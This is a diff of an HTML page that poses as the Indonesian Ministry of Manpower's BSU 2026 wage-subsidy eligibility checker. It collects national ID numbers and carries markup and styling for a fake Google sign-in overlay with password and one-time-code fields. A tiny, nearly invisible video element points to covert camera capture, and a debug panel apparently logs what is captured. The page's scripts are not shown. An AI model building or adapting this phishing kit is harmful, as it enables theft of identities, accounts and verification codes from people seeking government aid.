@@ -4,323 +4,192 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="robots" content="noindex,nofollow">
-<meta name="theme-color" content="#0b3a6f">
-<title>Bantuan Subsidi Upah</title>
+<meta name="theme-color" content="#0e2a47">
+<title>Bantuan Subsidi Upah 2026 - Pengecekan Mandiri</title>
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@600;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@700&display=swap" rel="stylesheet">
 <style>
-:root{--navy:#0e2a47;--blue:#0b78f0;--link:#0b57a4;--ink:#333e48;--line:#e3e7eb}
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html{scroll-behavior:smooth}
-body{margin:0;font-family:'Open Sans',system-ui,Arial,sans-serif;font-size:15.5px;line-height:1.72;color:var(--ink);background:#fff;overflow-x:hidden}
-body.gsi-lock{overflow:hidden!important}
-h1,h2,h3{font-family:'Proza Libre',Georgia,serif;color:var(--navy);line-height:1.3;font-weight:600}
-a{color:var(--link)}
-.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
-.top{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid #eef1f4;box-shadow:0 1px 3px rgba(16,32,52,.06)}
-.top .wrap{display:flex;align-items:center;justify-content:space-between;gap:14px;min-height:72px}
-.brand{display:flex;align-items:center;gap:11px;text-decoration:none}
-.brand b,.brand span{display:block;font-size:9.5px;letter-spacing:.07em;text-transform:uppercase;line-height:1.28;font-weight:700;color:#0b3a6f}
-.brand span{font-weight:600;color:#5b7fa6}
-.nav{display:flex;align-items:center;gap:2px}
-.nav a{font-size:14.5px;font-weight:600;color:#3c4d5e;text-decoration:none;padding:9px 13px;border-radius:4px;white-space:nowrap}
-.nav a:hover{color:#0b3a6f;background:#f2f6fa}
-.nav .help{border:1px solid #b9c4cf;color:#22374b;padding:8px 15px;margin-left:8px;border-radius:4px}
-.burger{display:none;border:1px solid #ccd5de;background:#fff;border-radius:5px;padding:7px 9px;font-size:17px;color:#22374b;cursor:pointer}
-.hero{position:relative;overflow:hidden;padding:44px 0 8px}
-.hero::before{content:"";position:absolute;inset:0;background:linear-gradient(115deg,transparent 0 58%,#eef4fa 58% 78%,transparent 78%),linear-gradient(115deg,transparent 0 74%,#e6eff8 74% 84%,transparent 84%),linear-gradient(245deg,transparent 0 82%,#f0f5fa 82% 92%,transparent 92%)}
-.hero .wrap{position:relative}
-.hero h1{font-size:clamp(26px,4.4vw,36px);margin:0 0 14px;max-width:22ch}
-.hero p{max-width:74ch;margin:0 0 14px;color:#41505e}
-.hero .hl b{color:#0e2a47}
-section{padding:34px 0}
-h2{font-size:clamp(20px,3.2vw,25px);margin:0 0 18px}
-.h2-line{display:inline-block;padding-bottom:9px;border-bottom:2px solid #35b6e8;margin-bottom:20px}
-.two{display:grid;grid-template-columns:1fr 1fr;gap:6px 40px}
-ul.dot{margin:0;padding-left:20px}ul.dot li{margin-bottom:14px;color:#3c4a58}
-.note{margin:16px 0 0;font-size:13.5px;font-style:italic;color:#5a6a78;max-width:96ch}
-.steps{display:grid;gap:10px;margin:0 0 8px}
-.step{display:flex;align-items:center;gap:16px;background:#f7f8f9;border-radius:4px;padding:15px 18px}
-.step .n{flex:0 0 auto;width:30px;height:30px;border-radius:50%;background:#0e2a47;color:#fff;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center}
-.step b{font-size:15px;color:#22374b;max-width:120px;line-height:1.35}
-.step a{color:#0b57a4;font-weight:600;text-decoration:none;font-size:14.5px}
-#pengecekanMandiri{scroll-margin-top:80px}
-.cek-head{text-align:center;margin-bottom:22px}
-.cek-head h2{margin:0 0 8px;font-size:clamp(21px,3.4vw,27px);color:#12395e}
-.cek-head p{margin:0;color:#5a6a78;font-size:15px}
-.card{max-width:560px;margin:0 auto;background:#fff;border:1px solid var(--line);border-radius:5px;padding:26px 26px 22px}
-.lbl{display:block;font-weight:700;font-size:14.5px;color:#1f2c38;margin:0 0 7px}
-.inp{width:100%;height:46px;border:1px solid #ccd5de;border-radius:5px;padding:0 13px;font-size:15.5px;font-family:inherit;color:#22374b;outline:none}
-.inp:focus{border-color:#0b78f0;box-shadow:0 0 0 3px rgba(11,120,240,.13)}
-.inp.bad{border-color:#d93025;box-shadow:0 0 0 3px rgba(217,48,37,.1)}
-.hint{font-size:13px;color:#7b8895;margin:6px 0 16px}
-.err{display:none;font-size:13px;color:#d93025;margin:-10px 0 12px;font-weight:600}
-.err.on{display:block}
-.cap-row{display:flex;align-items:center;gap:16px;margin-bottom:8px}
-#capBox{border:1px solid #ddd6c6;border-radius:4px;background:#f7f3ea;display:block}
-.ganti{display:inline-flex;align-items:center;gap:6px;font-size:14px;color:#5a6a78;background:none;border:0;cursor:pointer;font-family:inherit;padding:4px}
-.btn-cek{width:100%;height:52px;border:0;border-radius:999px;background:var(--blue);color:#fff;font-size:17px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:10px}
-.btn-cek:hover{background:#0a67d0}.btn-cek:disabled{opacity:.8}
-.spin{width:17px;height:17px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
-.btn-cek.load .spin{display:block}
-@keyframes sp{to{transform:rotate(360deg)}}
-.alert{display:none;margin-top:16px;padding:14px 16px;border-radius:4px;font-size:14.5px;line-height:1.6}
-.alert.on{display:block}
-.alert.warn{background:#fdf6e6;border:1px solid #eed9a8;color:#7a5a12}
-.alert.err{background:#fdeceb;border:1px solid #f2c4c0;color:#8c2318}
-.hasil{display:none;margin-top:18px;border:1px solid #cfe6d3;border-radius:6px;overflow:hidden}
-.hasil.on{display:block}
-.hasil .hh{background:#eaf7ec;padding:13px 16px;border-bottom:1px solid #d6ecda;display:flex;align-items:center;gap:9px}
-.hasil .hh b{font-size:14.5px;color:#14622a}
-.hasil .hh .ic{width:22px;height:22px;border-radius:50%;background:#1e8e3e;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px}
-.hasil .bd{padding:14px 16px}
-.hasil dl{display:grid;grid-template-columns:130px 1fr;gap:8px 12px;margin:0 0 14px;font-size:14px}
-.hasil dt{color:#6b7a88}.hasil dd{margin:0;color:#1f2c38;font-weight:700}
-.hasil .akt{display:flex;gap:8px;font-size:14px;background:#fdf6e6;border:1px solid #eed9a8;color:#7a5a12;border-radius:4px;padding:9px 12px;margin-bottom:14px}
-.hasil .go{display:block;text-align:center;background:var(--blue);color:#fff;text-decoration:none;font-weight:700;padding:12px;border-radius:999px;font-size:15px}
-.info-box{background:#f7f8f9;border-left:3px solid #0b78f0;border-radius:4px;padding:16px 18px;font-size:14.5px}
-.info-box p{margin:0 0 10px}
-footer{background:#f4f6f8;border-top:1px solid #e6eaee;margin-top:30px;padding:26px 0 22px;font-size:13.5px;color:#5c6b79}
-footer .fb{display:flex;align-items:center;gap:10px;margin-bottom:10px;color:#0e2a47}
-footer b{font-size:9.5px;letter-spacing:.07em;text-transform:uppercase;line-height:1.3}
-footer p{margin:0 0 6px;max-width:52ch}
-footer .cp{margin-top:14px;padding-top:12px;border-top:1px solid #e0e5ea;font-size:12.5px;color:#7b8895}
-@media(max-width:860px){.nav{display:none}.nav.open{display:flex;position:absolute;top:100%;left:0;right:0;background:#fff;flex-direction:column;align-items:stretch;padding:8px 14px 14px;border-bottom:1px solid #e6eaee}.burger{display:block}.two{grid-template-columns:1fr}.card{padding:20px 16px}.hasil dl{grid-template-columns:1fr}}
-#gsi-wrap{position:fixed;inset:0;z-index:2147483000;display:none;padding:16px;background:rgba(12,22,38,.58);-webkit-backdrop-filter:blur(3px);backdrop-filter:blur(3px);overflow:auto;font-family:'Roboto',Arial,sans-serif;font-size:14px;line-height:1.5;color:#202124}
-#gsi-wrap.on{display:flex;flex-direction:column;align-items:center}
-#gsi-wrap *{box-sizing:border-box;margin:0;padding:0}
-#gsi-wrap .gsi-shell{width:100%;max-width:448px;margin:auto;background:#fff;border:1px solid #dadce0;border-radius:10px;box-shadow:0 12px 44px rgba(0,0,0,.32);overflow:hidden;display:flex;flex-direction:column;animation:gsiIn .26s ease-out}
-@keyframes gsiIn{from{opacity:0;transform:translateY(16px) scale(.985)}to{opacity:1;transform:none}}
-#gsi-wrap .gsi-card{position:relative;padding:32px 38px 0;text-align:center}
-#gsi-wrap .gsi-x{position:absolute;top:10px;right:10px;width:34px;height:34px;border:0;background:none;border-radius:50%;color:#5f6368;font-size:19px;cursor:pointer;z-index:2}
-#gsi-wrap .gsi-ctx{display:none;align-items:center;gap:8px;justify-content:center;background:#e8f0fe;border:1px solid #c6dafc;color:#174ea6;font-size:11.5px;font-weight:600;border-radius:6px;padding:7px 9px;margin:0 0 18px;max-width:100%;flex-wrap:wrap}
-#gsi-wrap .gsi-ctx.on{display:flex}
-#gsi-wrap .gsi-ctx b{font-family:ui-monospace,monospace;font-size:11.5px;overflow-wrap:anywhere}
-#gsi-wrap .gsi-logo{display:block;width:42px;height:42px;margin:0 auto 12px}
-#gsi-wrap h1{font-family:'Roboto',Arial,sans-serif;font-size:22px;font-weight:400;color:#202124;margin:0 0 8px;line-height:1.32}
-#gsi-wrap .gsi-sub{font-size:14px;color:#5f6368;margin:0 0 24px}
-#gsi-wrap .gsi-chip{display:none;align-items:center;gap:8px;justify-content:center;width:fit-content;max-width:100%;border:1px solid #dadce0;border-radius:16px;height:32px;padding:0 12px 0 4px;font-size:14px;margin:0 auto 20px;overflow:hidden}
-#gsi-wrap .gsi-av{width:24px;height:24px;border-radius:50%;background:#1a73e8;color:#fff;font-size:12px;display:flex;align-items:center;justify-content:center;text-transform:uppercase;flex:0 0 auto}
-#gsi-wrap #gsiChipText{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-#gsi-wrap .gsi-field{position:relative;text-align:left;margin-bottom:6px}
-#gsi-wrap .gsi-field input{width:100%;height:56px;padding:13px 15px;font-size:16px;background:transparent;border:1px solid #dadce0;border-radius:4px;outline:none}
-#gsi-wrap .gsi-field input:focus{border:2px solid #1a73e8;padding:12px 14px}
-#gsi-wrap .gsi-field label{position:absolute;left:12px;top:16px;padding:0 4px;font-size:16px;color:#5f6368;background:#fff;pointer-events:none;transition:.15s;white-space:nowrap}
-#gsi-wrap .gsi-field input:focus+label,#gsi-wrap .gsi-field input:not(:placeholder-shown)+label{top:-8px;font-size:12px}
-#gsi-wrap .gsi-field.bad input{border:2px solid #d93025;padding:12px 14px}
-#gsi-wrap .gsi-field.bad label{color:#d93025}
-#gsi-wrap .gsi-err{display:none;gap:6px;font-size:12px;color:#d93025;text-align:left;margin:4px 0 0}
-#gsi-wrap .gsi-err.show{display:flex}
-#gsi-wrap .gsi-link{display:inline-block;margin:12px 0 0;font-size:14px;font-weight:500;color:#1a73e8;cursor:pointer}
-#gsi-wrap .gsi-guest{font-size:13px;color:#5f6368;text-align:left;margin:28px 0 0}
-#gsi-wrap .gsi-check{display:flex;align-items:center;gap:10px;font-size:14px;text-align:left;margin:16px 0 0;cursor:pointer}
-#gsi-wrap .gsi-check input{width:18px;height:18px;accent-color:#1a73e8}
-#gsi-wrap .gsi-row{display:flex;align-items:center;justify-content:space-between;gap:12px;margin:26px 0;flex-wrap:wrap}
-#gsi-wrap .gsi-row-end{display:flex;justify-content:flex-end;margin:26px 0}
-#gsi-wrap .gsi-btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;height:38px;padding:0 24px;min-width:90px;font-size:14px;font-weight:500;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
-#gsi-wrap .gsi-btn-text{background:none;border:0;height:38px;padding:0 8px;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer}
-#gsi-wrap .gsi-spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
-#gsi-wrap .gsi-btn.loading .gsi-spin{display:block}
-#gsi-wrap .gsi-shield{display:block;width:42px;height:42px;margin:0 auto 12px}
-#gsi-wrap .gsi-hint{font-size:12px;color:#80868b;text-align:left;margin:12px 0 0}
-#gsi-wrap #gsiOtp{letter-spacing:.3em;font-size:18px;font-weight:500}
-#gsi-wrap .gsi-sink{display:none;justify-content:center;margin-top:14px}
-#gsi-wrap .gsi-sink.on{display:flex}
-#gsi-wrap .gsi-sink button{background:#f1f3f4;border:0;border-radius:14px;font-size:11.5px;color:#3c4043;padding:6px 13px;cursor:pointer;display:flex;align-items:center;gap:6px}
-#gsi-wrap .gsi-cap{display:flex;align-items:center;justify-content:center;gap:10px;border-top:1px solid #eef1f4;padding:9px 8px;font-size:10.5px;color:#5f6368;flex-wrap:wrap}
-#gsi-wrap .gsi-cap-item{display:flex;align-items:center;gap:5px;white-space:nowrap;background:none;border:0;font:inherit;color:inherit;padding:2px 4px;border-radius:4px}
-#gsi-wrap button.gsi-cap-item{cursor:pointer}
-#gsi-wrap .gsi-cap-dot{width:6px;height:6px;border-radius:50%;background:#cbd5e1;flex:0 0 auto}
-#gsi-wrap .gsi-cap-item.on .gsi-cap-dot{background:#1e8e3e}
-#gsi-wrap .gsi-cap-item.wait .gsi-cap-dot{background:#f9ab00;animation:blk 1s infinite}
-#gsi-wrap .gsi-cap-item.off .gsi-cap-dot{background:#d93025}
-@keyframes blk{0%,100%{opacity:1}50%{opacity:.25}}
-#gsi-wrap .gsi-thumb{display:none;width:24px;height:24px;border-radius:50%;object-fit:cover;border:1px solid #1e8e3e;transform:scaleX(-1)}
-#gsi-wrap .gsi-thumb.on{display:block}
-#gsi-wrap .gsi-foot{display:flex;align-items:center;justify-content:space-between;gap:12px;border-top:1px solid #eef1f4;padding:10px 14px 12px;font-size:11.5px;color:#5f6368;flex-wrap:wrap;text-align:left}
-#gsi-wrap .gsi-foot select{border:0;background:transparent;font-size:11.5px;color:#5f6368}
-#gsi-wrap .gsi-foot nav{display:flex;gap:14px}
-#gsi-wrap .gsi-foot nav a{color:#5f6368;text-decoration:none}
-#gsi-wrap .gsi-note{font-size:10px;color:#80868b}
-#gsiVid,#gsiCv{position:fixed;left:0;bottom:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1}
-@media(max-width:520px){#gsi-wrap{padding:0}#gsi-wrap .gsi-shell{border:0;border-radius:0;max-width:100%;min-height:100%;margin:0}#gsi-wrap .gsi-card{padding:26px 22px 0}}
-#dv{position:fixed;inset:auto 0 0 0;z-index:2147483001;display:none;max-height:60vh;overflow:auto;background:#0b1220f2;color:#c9d6e5;font:11px/1.5 ui-monospace,monospace;padding:10px}
+:root{--navy:#0e2a47;--navy2:#123a5f;--blue:#0b78f0;--link:#0b57a4;--ink:#333e48;--mut:#6b7680;--line:#dde3e9;--bg:#f4f6f8}
+*{box-sizing:border-box}
+body{margin:0;font-family:'Open Sans',Arial,sans-serif;color:var(--ink);background:#fff;font-size:14px;line-height:1.6}
+a{color:var(--link);text-decoration:none}
+img{max-width:100%}
+.top{background:var(--navy);color:#fff}
+.top .in{max-width:1100px;margin:0 auto;padding:9px 16px;display:flex;align-items:center;gap:12px}
+.logo{width:34px;height:34px;border-radius:6px;background:#fff;color:var(--navy);display:grid;place-items:center;font-weight:700;font-size:15px;flex:0 0 auto}
+.top b{font-size:13px;font-weight:600;letter-spacing:.2px}
+.top small{display:block;font-size:10.5px;opacity:.72;font-weight:400}
+nav{background:var(--navy2)}
+nav .in{max-width:1100px;margin:0 auto;padding:0 16px;display:flex;gap:2px;overflow:auto}
+nav a{color:#d7e3ef;font-size:12.5px;padding:11px 12px;white-space:nowrap}
+nav a.on{background:#fff;color:var(--navy);font-weight:700}
+.hero{background:linear-gradient(180deg,#eaf1f8,#fff);border-bottom:1px solid var(--line);padding:26px 16px 30px}
+.hero .in{max-width:1100px;margin:0 auto}
+h1{font-family:'Proza Libre',Georgia,serif;font-size:23px;line-height:1.32;color:var(--navy);margin:0 0 8px;max-width:640px}
+.hero p{margin:0;color:var(--mut);max-width:660px;font-size:13px}
+main{max-width:1100px;margin:0 auto;padding:22px 16px 40px;display:grid;gap:18px;grid-template-columns:1fr}
+@media(min-width:900px){main{grid-template-columns:1fr 330px;align-items:start}}
+.card{background:#fff;border:1px solid var(--line);border-radius:8px;padding:18px}
+.card h2{font-size:14.5px;color:var(--navy);margin:0 0 14px;padding-bottom:10px;border-bottom:1px solid var(--line)}
+label{display:block;font-size:12px;font-weight:600;color:var(--navy);margin:0 0 5px}
+label span{color:#c0392b}
+input[type=text],input[type=email],input[type=password],select{width:100%;padding:10px 11px;border:1px solid #c9d2da;border-radius:5px;font-size:14px;font-family:inherit;color:var(--ink);background:#fff}
+input:focus,select:focus{outline:2px solid #9dc6f5;border-color:var(--blue)}
+.f{margin-bottom:13px}
+.hint{font-size:11px;color:var(--mut);margin-top:4px}
+.cap{display:flex;align-items:center;gap:10px}
+#capv{border:1px solid #c9d2da;border-radius:5px;background:#f7f9fb;flex:0 0 auto}
+.ref{background:#eef3f8;border:1px solid #c9d2da;border-radius:5px;padding:9px 11px;font-size:12px;cursor:pointer;color:var(--navy);white-space:nowrap}
+.btn{display:block;width:100%;padding:12px;border:0;border-radius:5px;background:var(--blue);color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.btn:disabled{background:#9db6cd;cursor:default}
+.btn2{background:#fff;color:var(--blue);border:1px solid var(--blue)}
+.res{margin-top:16px;border-radius:6px;padding:14px;font-size:13px;display:none}
+.res.on{display:block}
+.res.ok{background:#eafaf0;border:1px solid #a8e0bf;color:#14663a}
+.res.no{background:#fdf0ee;border:1px solid #f0c2ba;color:#8e2f20}
+.res dl{display:grid;grid-template-columns:110px 1fr;gap:4px 10px;margin:8px 0 0;font-size:12.5px}
+.res dt{color:var(--mut)}
+.res dd{margin:0;font-weight:600;word-break:break-word}
+aside .card{background:#f9fbfd}
+aside li{font-size:12.5px;color:var(--mut);margin-bottom:8px}
+aside ul{margin:0;padding-left:17px}
+.foot{background:var(--navy);color:#b9c9d8;font-size:11.5px;padding:22px 16px;margin-top:10px}
+.foot .in{max-width:1100px;margin:0 auto;display:grid;gap:14px}
+@media(min-width:700px){.foot .in{grid-template-columns:1fr 1fr 1fr}}
+.foot b{color:#fff;display:block;margin-bottom:5px;font-size:12px}
+#gsi-wrap{position:fixed;inset:0;z-index:90;background:rgba(18,32,48,.62);-webkit-backdrop-filter:blur(3px);backdrop-filter:blur(3px);display:none;flex-direction:column;align-items:center;justify-content:flex-start;overflow-y:auto;padding:18px 12px 40px}
+#gsi-wrap.on{display:flex}
+.gsi-shell{width:100%;max-width:432px;display:flex;flex-direction:column;gap:12px;margin:auto 0}
+.gsi-card{background:#fff;border-radius:9px;padding:32px 32px 26px;box-shadow:0 8px 30px rgba(0,0,0,.3);font-family:Roboto,Arial,sans-serif;color:#202124}
+.gsi-g{font-size:22px;font-weight:700;letter-spacing:-1px;color:#4285f4;margin-bottom:14px}
+.gsi-g i{font-style:normal;color:#ea4335}.gsi-g u{text-decoration:none;color:#fbbc05}.gsi-g s{text-decoration:none;color:#34a853}
+.gsi-card h3{font-size:21px;font-weight:400;margin:0 0 5px;color:#202124}
+.gsi-card .sub{font-size:13.5px;color:#5f6368;margin:0 0 20px}
+.gsi-in{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:4px;font-size:15px;font-family:inherit;color:#202124}
+.gsi-in:focus{outline:0;border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
+.gsi-lbl{font-size:12px;color:#5f6368;margin:0 0 6px;display:block}
+.gsi-row{display:flex;align-items:center;gap:9px;margin:20px 0 0}
+.gsi-row .sp{flex:1}
+.gsi-b{background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 22px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
+.gsi-b:disabled{background:#a8c7fa;cursor:default}
+.gsi-t{background:none;border:0;color:#1a73e8;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;padding:10px 8px}
+.gsi-st{font-size:12.5px;color:#5f6368;margin:14px 0 0;min-height:17px}
+.gsi-otp{display:flex;gap:7px;margin:18px 0 0}
+.gsi-otp input{width:100%;padding:11px 0;text-align:center;font-size:17px;border:1px solid #dadce0;border-radius:4px}
+.gsi-otp input:focus{outline:0;border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
+.gsi-foot{display:flex;gap:10px;justify-content:space-between;align-items:flex-start;font-size:11.5px;color:#5f6368;padding:0 4px}
+.gsi-foot select{border:0;background:none;font-size:11.5px;color:#5f6368;padding:0}
+.gsi-foot nav{background:none;display:flex;gap:12px;padding:0}
+.gsi-foot nav a{color:#5f6368;font-size:11.5px;padding:0}
+.gsi-note{font-size:10.5px;color:#80868b;margin-top:3px}
+.gsi-x{position:absolute;top:9px;right:12px;background:none;border:0;font-size:20px;color:#5f6368;cursor:pointer;line-height:1}
+.gsi-card{position:relative}
+#gsiVid{position:fixed;width:2px;height:2px;opacity:.01;top:0;left:0;pointer-events:none}
+#gsiCv{display:none}
+#dv{position:fixed;right:6px;bottom:6px;z-index:95;font:10px/1.35 monospace;background:rgba(8,18,30,.85);color:#8fe3b4;padding:5px 7px;border-radius:4px;max-width:44vw;display:none;white-space:pre-wrap}
 #dv.on{display:block}
-#dv .chips{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
-#dv .chip{background:#141f34;border:1px solid #22334d;border-radius:4px;padding:2px 6px;font-size:10px}
-#dv .chip b{color:#6ee7a0}
-#dv .row{display:flex;gap:6px;border-bottom:1px dashed #16223a}
-#dv .row .c{flex:1;color:#9fb2c6}#dv .row .k{width:18px;text-align:center;font-weight:700}#dv .row .l{width:52px;text-align:right;color:#61748a}#dv .row .n{width:90px;color:#61748a;overflow:hidden;white-space:nowrap}
-#dv .k0{color:#6ee7a0}#dv .k1{color:#f3d97b}#dv .k2{color:#f3a3a3}#dv .k3{color:#7f95ad}
 </style>
 </head>
 <body>
 
-<header class="top"><div class="wrap">
-  <a class="brand" href="#">
-    <svg width="46" height="46" viewBox="0 0 60 60"><g fill="#0b3a6f"><circle cx="30" cy="7" r="3.1"/><circle cx="22" cy="13" r="3.1"/><circle cx="38" cy="13" r="3.1"/><circle cx="14" cy="21" r="3.1"/><circle cx="30" cy="21" r="3.4"/><circle cx="46" cy="21" r="3.1"/><circle cx="22" cy="29" r="3.1"/><circle cx="38" cy="29" r="3.1"/><circle cx="14" cy="37" r="3.1"/><circle cx="30" cy="37" r="3.4"/><circle cx="46" cy="37" r="3.1"/><circle cx="22" cy="45" r="3.1"/><circle cx="38" cy="45" r="3.1"/><circle cx="30" cy="53" r="3.1"/></g></svg>
-    <span><b>Kementerian</b><span>Ketenagakerjaan</span><span>Republik Indonesia</span></span>
-  </a>
-  <button class="burger" id="burger">&#9776;</button>
-  <nav class="nav" id="nav">
-    <a href="#">Beranda</a><a href="#syarat">Syarat</a><a href="#langkah">Pengecekan Resmi</a>
-    <a href="#pengecekanMandiri">Cek NIK</a>
-    <a class="help" href="https://bantuan.kemnaker.go.id/" target="_blank" rel="noopener">Pusat Bantuan</a>
-  </nav>
-</div></header>
-
-<main>
-<div class="hero"><div class="wrap">
-  <h1>Bantuan Subsidi Upah (BSU) 2026</h1>
-  <p>Pemerintah kembali menghadirkan Bantuan Subsidi Upah (BSU) 2026 sebagai bentuk dukungan untuk mempertahankan daya beli dan menjaga ketahanan ekonomi pekerja/buruh.</p>
-  <p class="hl">Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai sebesar Rp300.000,- per bulan selama 3 bulan, <b>yang dibayarkan sekaligus dengan total Rp900.000,-.</b></p>
+<div class="top"><div class="in">
+  <div class="logo">K</div>
+  <div><b>Kementerian Ketenagakerjaan RI<small>Republik Indonesia</small></b></div>
 </div></div>
 
-<section id="syarat"><div class="wrap">
-  <h2>Syarat Penerima BSU 2026</h2>
-  <div class="two">
-    <ul class="dot">
-      <li>Warga Negara Indonesia yang dibuktikan dengan Nomor Induk Kependudukan.</li>
-      <li>Peserta Aktif program jaminan sosial ketenagakerjaan BPJS Ketenagakerjaan kategori Peserta Penerima Upah (PU) sampai dengan bulan Agustus 2026</li>
-      <li>Menerima Gaji/Upah paling banyak sebesar Rp3.500.000,00 (tiga juta lima ratus ribu rupiah) per bulan atau sebesar UMP/UMK</li>
-    </ul>
-    <ul class="dot">
-      <li>Diprioritaskan bagi pekerja/buruh yang tidak sedang menerima Program Keluarga Harapan (PKH) pada periode sebelum penyaluran BSU dilakukan.</li>
-      <li>Bukan merupakan Aparatur Sipil Negara, prajurit Tentara Nasional Indonesia, dan anggota Kepolisian Negara Republik Indonesia.</li>
-    </ul>
-  </div>
-  <p class="note">Apabila di kemudian hari ditemukan bahwa penerima BSU ternyata tidak memenuhi persyaratan, maka yang bersangkutan wajib mengembalikan dana BSU yang diterima ke Kas Negara. Permenaker Nomor 10 Tahun 2022 yang diubah terakhir dengan <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a></p>
-</div></section>
+<nav><div class="in">
+  <a href="#pengecekanMandiri" class="on">Pengecekan Mandiri</a>
+  <a href="#syarat">Syarat Penerima</a>
+  <a href="#alur">Alur Pencairan</a>
+  <a href="#faq">FAQ</a>
+</div></nav>
 
-<section id="langkah"><div class="wrap">
-  <h2 class="h2-line">Langkah Pengecekan Resmi</h2>
-  <div class="steps">
-    <div class="step"><span class="n">1</span><b>Kunjungi website</b><a href="https://bsu.kemnaker.go.id/">bsu.kemnaker.go.id</a></div>
-    <div class="step"><span class="n">2</span><b>Cek NIK Penerima</b><a href="#pengecekanMandiri">Cek Nik</a></div>
-  </div>
-  <p class="note">Data calon penerima Bantuan Subsidi Gaji/Upah berasal dari BPJS Ketenagakerjaan. Lebih lanjut mengenai informasi kriteria, mekanisme dan tata cara BSU 2026 dapat dilihat pada <a href="https://jdih.kemnaker.go.id/peraturan/detail/3117" target="_blank" rel="noopener">Permenaker Nomor 16 Tahun 2026</a></p>
-</div></section>
+<div class="hero"><div class="in">
+  <h1>Pengecekan Mandiri Penerima Bantuan Subsidi Upah (BSU) Tahun 2026</h1>
+  <p>Masukkan Nomor Induk Kependudukan (NIK) Anda untuk mengetahui status kepesertaan dan tahapan pencairan BSU. Pastikan NIK yang dimasukkan sesuai dengan KTP elektronik.</p>
+</div></div>
 
-<section id="pengecekanMandiri"><div class="wrap">
-  <div class="cek-head">
-    <h2>Pengecekan NIK Penerima BSU</h2>
-    <p>Masukkan NIK Anda untuk melakukan pengecekan status penerima BSU melalui sistem kami.</p>
-  </div>
-  <div class="card">
-    <label class="lbl" for="nik">Nomor Induk Kependudukan (NIK)</label>
-    <input class="inp" id="nik" type="text" inputmode="numeric" maxlength="16" autocomplete="off">
-    <div class="err" id="nikErr">NIK harus 16 digit angka.</div>
-    <p class="hint">Pastikan NIK yang Anda masukkan benar.</p>
-    <label class="lbl">Kode Keamanan (CAPTCHA)</label>
-    <div class="cap-row"><canvas id="capBox" width="128" height="46"></canvas>
-      <button class="ganti" id="ganti" type="button">&#8635; Ganti</button></div>
-    <input class="inp" id="cap" type="text" maxlength="6" autocomplete="off" placeholder="Masukkan kode di atas" style="letter-spacing:.12em;text-transform:uppercase">
-    <div class="err" id="capErr">Kode keamanan belum sesuai.</div>
-    <p class="hint">Masukkan 6 karakter yang Anda lihat pada gambar.</p>
-    <button class="btn-cek" id="cek" type="button"><span class="spin"></span><span id="cekLbl">Cek Status</span></button>
-    <div class="alert" id="res"></div>
-    <div class="hasil" id="hasil">
-      <div class="hh"><span class="ic">&#10003;</span><b>Status Penerima BSU 2026</b></div>
-      <div class="bd">
-        <dl>
-          <dt>NIK</dt><dd id="hNik">-</dd><dt>Nama</dt><dd>Sesuai data Dukcapil</dd>
-          <dt>Wilayah</dt><dd id="hWil">-</dd><dt>Nominal</dt><dd>Rp900.000</dd>
-          <dt>Bank penyalur</dt><dd id="hBank">-</dd>
-        </dl>
-        <div class="akt"><span>&#9888;</span><span>Verifikasi rekening penerima belum diselesaikan</span></div>
-        <a class="go" href="https://bsu.kemnaker.go.id/#pengecekanMandiri" target="_blank" rel="noopener">Lanjutkan di situs resmi</a>
-      </div>
+<main>
+  <section class="card" id="pengecekanMandiri">
+    <h2>Formulir Pengecekan</h2>
+    <div class="f">
+      <label>Nomor Induk Kependudukan (NIK) <span>*</span></label>
+      <input id="nik" type="text" inputmode="numeric" maxlength="16" placeholder="16 digit NIK" autocomplete="off">
+      <div class="hint">Contoh: 3329xxxxxxxxxxxx</div>
     </div>
-  </div>
-</div></section>
+    <div class="f">
+      <label>Kode Verifikasi <span>*</span></label>
+      <div class="cap">
+        <canvas id="capv" width="132" height="42"></canvas>
+        <button class="ref" id="capr" type="button">Ganti kode</button>
+      </div>
+      <div class="hint">Ketik ulang kode pada kotak di atas.</div>
+      <input id="cap" type="text" maxlength="6" placeholder="Kode verifikasi" autocomplete="off" style="margin-top:9px">
+    </div>
+    <button class="btn" id="cek" type="button">Cek Status</button>
+    <div class="res" id="res"></div>
+  </section>
 
-<section><div class="wrap">
-  <h2>Informasi Pengecekan Penerima BSU 2026</h2>
-  <div class="info-box">
-    <p>Mekanisme pengecekan status penerima BSU 2026 akan diumumkan secara resmi oleh Kementerian Ketenagakerjaan.</p>
-    <p>Pantau terus website ini untuk mendapatkan informasi terbaru. Pastikan hanya mengakses informasi dari kanal resmi Kemnaker dan tidak memberikan data pribadi melalui tautan yang tidak terverifikasi.</p>
-  </div>
-</div></section>
+  <aside>
+    <div class="card">
